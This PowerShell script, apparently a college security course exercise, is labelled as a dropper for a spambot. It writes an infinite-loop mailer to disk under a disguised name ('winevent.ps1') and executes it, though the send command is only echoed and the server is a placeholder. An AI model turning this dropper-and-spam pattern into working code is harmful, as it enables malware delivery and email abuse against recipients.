<#
    Storyline: Dropper for your spambot that will save to a directory
    and then execute it.
#>

 $writeSbBot = @'
# Send an email using Powershell
$toSend = @('dune@mymail.champlain.edu','null@champlain.edu','dunston@champlain.edu')

# Message body
$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt
ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris 
nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit 
esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in 
culpa qui officia deserunt mollit anim id est laborum."


while($true) {

    foreach ($email in $toSend) {

        # Send the email
        Write-Host "Send-MailMessage -From 'dunstonn@mymail.champlain.edu' -To $email -Subject 'Tisk Tisk' `
        -Body $msg -SmtpServer X.X.X.X"

        # Pause for 1 second
        #start-sleep 1

    }

}

'@

# Directory to write the bot
$sbDir = 'C:\Users\paul.gleason\Documents\SYS-320\'

# Create a random number to add to the file.
$sbRand = Get-Random -Minimum 1000 -Maximum 1999

# Create the file and location to save the bot
$file = $sbDir + $sbRand + "winevent.ps1"

# write to a file
$writeSbBot | Out-File -FilePath $file

# Exectue the PowerShell script
Invoke-Expression $file